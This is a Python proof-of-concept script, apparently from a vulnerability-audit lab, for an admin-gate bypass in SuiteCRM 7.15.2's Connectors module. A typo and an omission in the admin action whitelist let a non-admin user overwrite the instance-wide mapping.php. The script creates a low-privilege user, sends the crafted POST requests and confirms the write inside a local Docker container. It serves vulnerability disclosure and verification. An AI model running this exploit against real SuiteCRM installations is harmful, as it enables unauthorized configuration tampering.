#!/usr/bin/env python3
"""
VULN-049 -- Connectors module admin-gate bypass: non-admin writes global
            connector config (whitelist typo + omission)

Target:   SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:     modules/Connectors/controller.php:613-680 (action_SaveModifyMapping)
              -> write_array_to_file('mapping', $mapping, "{$dir}/mapping.php")
              at :664. Reached because $admin_actions (:52-54) has the typo
              'SavedModifyDisplay' (extra 'd') instead of the real method
              name 'SaveModifyDisplay', AND never lists 'SaveModifyMapping'
              at all -- so process() never sets hasAccess=false for either.

What this script does
----------------------
1. Logs in as admin, creates one fresh low-priv (non-admin) user U.
2. Control: as U, POST to a real admin-gated sibling action (ConnectorSettings,
   which IS spelled correctly in $admin_actions) and confirm denial.
3. Attack: as U, POST action=SaveModifyMapping for the default-shipped
   'ext_rest_insideview' connector source with a harmless, random-suffixed
   marker as the mapped Accounts.name field.
4. Verifies the REAL effect: `docker compose exec app cat
   custom/modules/Connectors/connectors/sources/ext/rest/insideview/mapping.php`
   -- the instance-wide connector mapping file -- now contains the
   non-admin-supplied marker string.
5. Bonus: also exercises action_SaveModifyDisplay (the OTHER whitelist gap --
   'SavedModifyDisplay' in the list never matches the real action name
   'SaveModifyDisplay') and confirms it likewise runs for U (no denial page).

Environment variables (defaults match claude_audit/SuiteCRM/SuiteCRM_summary.md):
    BASE_URL, ADMIN_USER, ADMIN_PASS, COMPOSE_PROJECT

Exit code 0 + "[OK]" on CONFIRMED, non-zero + "[FAIL]" otherwise.
"""
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session, create_user, web_login)

VULN_ID = "VULN-049"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")
MAPPING_PATH = "/var/www/html/custom/modules/Connectors/connectors/sources/ext/rest/insideview/mapping.php"


def save_evidence(name, request_txt, response_obj):
    with open(os.path.join(HERE, "evidence", f"{name}_request.txt"), "w") as f:
        f.write(request_txt)
    with open(os.path.join(HERE, "evidence", f"{name}_response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {response_obj.status_code} {response_obj.reason}\n")
        for k, v in response_obj.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(response_obj.text[:120000])


def app_exec(*cmd):
    r = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "app", *cmd],
        capture_output=True, text=True, timeout=30,
    )
    return r.stdout


def main():
    banner(VULN_ID, "Connectors admin-gate bypass: non-admin writes mapping.php")

    log("SETUP", "admin web login + create one fresh low-priv (non-admin) user U")
    admin = admin_session()
    u = create_user(admin, "Map@2026x!")
    log("INFO", f"U = {u['user_name']} ({u['id']})")
    us = web_login(u["user_name"], u["password"])

    # ---- Control: admin-gated sibling action (correctly spelled in $admin_actions) ----
    log("STEP", "control: U POSTs to the admin-gated sibling action=ConnectorSettings")
    ctrl = us.post(f"{BASE_URL}/index.php",
                    data={"module": "Connectors", "action": "ConnectorSettings"},
                    headers={"Referer": f"{BASE_URL}/index.php?module=Connectors&action=ConnectorSettings"},
                    allow_redirects=False, timeout=30)
    save_evidence("00_control_ConnectorSettings", "POST module=Connectors&action=ConnectorSettings\n", ctrl)
    denial_marker = "You do not have permission to access this module"
    denied = denial_marker in ctrl.text
    log("PROOF", f"control: ViewNoaccess denial text present (gate mechanism works for U): {denied}")

    # ---- Snapshot mapping.php BEFORE the attack ----
    before = app_exec("cat", MAPPING_PATH)
    log("INFO", f"mapping.php before attack (may not exist yet): {before[:200]!r}")

    # ---- Attack: action_SaveModifyMapping (absent from $admin_actions entirely) ----
    marker = rand("vuln049marker")
    log("STEP", f"attack: U (non-admin) POSTs action=SaveModifyMapping, marker={marker!r}")
    params = {"module": "Connectors", "action": "SaveModifyMapping"}
    body = {
        "mapping_sources": "ext_rest_insideview",
        "mapping_values": f"ext_rest_insideview:Accounts:name={marker}",
        "from_unit_test": "1",  # suppress the redirect so we can read the JSON/plain response directly
    }
    request_txt = (
        f"POST /index.php?module=Connectors&action=SaveModifyMapping HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<U-session (non-admin)>\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Referer: {BASE_URL}/index.php?module=Connectors&action=ModifyMapping\n\n"
        f"mapping_sources=ext_rest_insideview&mapping_values=ext_rest_insideview:Accounts:name={marker}&from_unit_test=1\n"
    )
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)
    r = us.post(f"{BASE_URL}/index.php", params=params, data=body, allow_redirects=False, timeout=30,
                headers={"Referer": f"{BASE_URL}/index.php?module=Connectors&action=ModifyMapping"})
    save_evidence("01_attack_SaveModifyMapping", request_txt, r)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r.status_code} {r.reason}\n\n{r.text[:5000]}")
    log("INFO", f"attack response status={r.status_code} len={len(r.text)}")

    # ---- Verify the REAL effect: mapping.php on the app container ----
    log("PROOF", f"reading {MAPPING_PATH} from the app container after the non-admin request")
    after = app_exec("cat", MAPPING_PATH)
    with open(os.path.join(HERE, "evidence", "mapping_php_after.txt"), "w") as f:
        f.write(after)
    landed = marker in after
    log("PROOF", f"marker {marker!r} present in instance-wide mapping.php: {landed}")
    if landed:
        idx = after.find(marker)
        log("PROOF", f"decisive line: {after[max(0,idx-80):idx+40].strip()!r}")

    # ---- Bonus: action_SaveModifyDisplay (the 'SavedModifyDisplay' typo gap) ----
    log("STEP", "bonus: U (non-admin) POSTs action=SaveModifyDisplay (whitelist has typo 'SavedModifyDisplay')")
    r_disp = us.post(f"{BASE_URL}/index.php",
                      params={"module": "Connectors", "action": "SaveModifyDisplay"},
                      data={"display_sources": "ext_rest_insideview",
                            "display_values": "ext_rest_insideview:Accounts",
                            "from_unit_test": "1"},
                      allow_redirects=False, timeout=30,
                      headers={"Referer": f"{BASE_URL}/index.php?module=Connectors&action=ModifyDisplay"})
    save_evidence("02_bonus_SaveModifyDisplay", "POST action=SaveModifyDisplay\n", r_disp)
    disp_denied = denial_marker in r_disp.text
    log("PROOF", f"SaveModifyDisplay as non-admin: status={r_disp.status_code} denial page shown: {disp_denied} "
                 f"(expected False -- also reachable via the same typo gap)")

    if not landed:
        verdict(VULN_ID, "FAILED", "marker did not land in the instance-wide mapping.php")
        sys.exit(1)

    log("OK", "non-admin U rewrote the instance-wide Connectors mapping.php via action_SaveModifyMapping")
    verdict(VULN_ID, "CONFIRMED",
            f"non-admin wrote marker {marker} into custom/.../insideview/mapping.php via SaveModifyMapping")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
